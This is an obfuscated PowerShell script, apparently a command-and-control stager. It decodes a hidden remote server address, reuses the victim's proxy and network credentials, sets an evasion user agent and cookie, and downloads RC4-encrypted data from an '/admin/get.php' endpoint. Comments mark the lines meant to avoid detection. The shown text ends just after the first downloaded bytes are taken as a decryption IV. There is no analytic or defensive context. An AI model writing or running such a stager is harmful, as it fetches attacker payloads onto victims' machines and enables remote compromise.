[SYStEm.NeT.ServICEPoINtMAnaGEr]::ExpECT100CONTINuE=0;
$f94E=New-OBjeCT SystEM.NeT.WebCLIeNT;
$u='Mozilla 69';
$ser=$([TeXT.ENcoDiNG]::UnIcOde.GetSTring([CONVERT]::FroMBasE64STRINg('aAB0AHQAcAA6AC8ALwAxADIALgA0ADgALgAxADgANgAuADkAOAA6ADQANAAzAA==')));
$t='/admin/get.php';
#-----UNDETECT----

$F94e.HEAders.ADD('User-Agent',$u);
$F94e.PROXY=[SySTem.NEt.WebREQUest]::DEFaUltWEbPROxy;
$f94e.PROxY.CredentIaLs = [SYsTem.NeT.CredENTiAlCACHe]::DEfAUlTNeTWORkCRedEnTiaLs;
$Script:Proxy = $f94e.Proxy;
#-----UNDETECT-----

$K=[SYStEM.Text.ENcODiNg]::ASCII.GeTBytES('a318e4507e5a74604aafb45e4741edd3');
$R={$D,$K=$ARgs;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.CouNT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};
$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-BxOr$S[($S[$I]+$S[$H])%256]}};
$f94E.HEaderS.AdD("Cookie","efgfCb=eIzFVdlUJJEWWhK8giBTzbpFtzs=");
$DatA=$F94e.DownLOadDATA($sER+$T);
$Iv=$DatA[0..3];
